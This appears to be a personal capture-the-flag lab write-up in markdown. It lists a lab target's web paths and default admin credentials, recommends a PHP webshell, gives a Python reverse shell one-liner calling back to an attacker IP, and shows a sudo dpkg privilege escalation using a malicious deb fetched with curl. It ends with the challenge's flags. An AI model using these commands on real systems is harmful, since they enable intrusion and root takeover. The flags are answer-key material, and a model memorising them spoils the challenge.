
IP=10.0.160.145

# Port
**port- 80**


path_to_check
'/auth/check'
/install
/finder
/assets


*Credentials*
~~~
username- admin
password- admin
~~~

This is the best php webshell file that helped me 
*phpbash.php*

#search_query
```
"github" "phpbash.php"
```

**My reverse shell payload in python**
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.43.230",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

After getting on the system, 
You would find the user you are logged on as, has a sudo privilege on a dpkg file 

![[Pasted image 20240921232013.png]]

With a little search on gtfobins, a way around this escalation 

![[Pasted image 20240921232226.png]]

Okay, we have to use the fpm(fotran package manager) to create a deb file on our host system and transfer it to the target machine. Before that we can install fpm on our host with the command below;

```
sudo gem install fpm
```

Now, copy and paste the commands from gtfobins;

```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```


Open a server (python i prefer) in the directory you create the deb file in

![[Pasted image 20240921232946.png]]

Now on the target machine, type;
```
curl http://<your-ip>:port/x_1.0_all.deb -o x_1.0_all.deb

sudo /bin/dpkg -i x_1.0_all.deb
```

Congratulation, you are now root :)
![[Pasted image 20240921233457.png]]



Thanks for reading although it's dump and hard to read. 

# Flags
user - ETSCTF_97e9e90a6617e514b7de4ef05c1cb03a
root - ETSCTF_53c8a434425067cb3ad91ea0f972b92e